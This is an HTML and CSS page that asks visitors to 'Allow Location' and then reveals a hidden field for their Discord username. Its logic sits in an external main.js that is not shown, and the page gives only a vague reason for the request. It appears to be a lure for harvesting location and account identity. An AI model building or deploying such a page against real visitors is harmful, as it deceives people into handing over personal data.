<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Location Access</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1600&q=80') no-repeat center center fixed;
      background-size: cover;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(5px);
    }

    .card {
      background: rgba(255, 255, 255, 0.9);
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
      max-width: 400px;
      width: 90%;
      text-align: center;
      animation: fadeIn 0.8s ease-out;
    }

    h2 {
      margin-bottom: 20px;
      color: #222;
    }

    p {
      color: #555;
      font-size: 15px;
      margin-bottom: 30px;
    }

    button {
      background-color: #4A90E2;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #357ABD;
    }

    input[type="text"] {
      padding: 10px;
      width: 80%;
      margin-top: 20px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 15px;
    }

    #status {
      margin-top: 20px;
      font-size: 14px;
      color: #444;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <div class="card">
    <h2>Location Access Required</h2>
    <p>To continue, we need your region to proceed. Allow Location</p>
    <button onclick="startFlow()">Allow Location</button>
    <div id="status"></div>
    <input type="text" id="discordUser" placeholder="Enter Discord username" style="display:none;" />
  </div>

  <script src="main.js"></script>
</body>
</html>
